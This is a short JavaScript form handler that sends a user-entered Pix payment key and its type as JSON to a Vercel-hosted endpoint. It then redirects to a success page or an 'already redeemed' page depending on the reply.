document.getElementById('formPix').addEventListener('submit', function(event) {
    event.preventDefault(); 

    
    let tipoChave = document.querySelector('input[name="tipoChave"]:checked');
    let tipoChaveValue = tipoChave ? tipoChave.value : '';

    
    let chavePix = document.getElementById('chavePix').value;

    
    let data = {
        key: chavePix,
        typeKey: tipoChaveValue
    };


   fetch('https://pix-6v3z2gpui-daanrox.vercel.app/create', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    })
    .then(response => response.json())
    .then(result => {
        console.log(result)
        if(result.message === "Chave pix já resgatada"){
            window.location.href='api2.html';
        } else if(result.response === "OK"){
            window.location.href='sucessod41d.html'
        }{
            console.log(result); 
        }
    })
    .catch(error => {
        console.error('Erro:', error);
    });
});
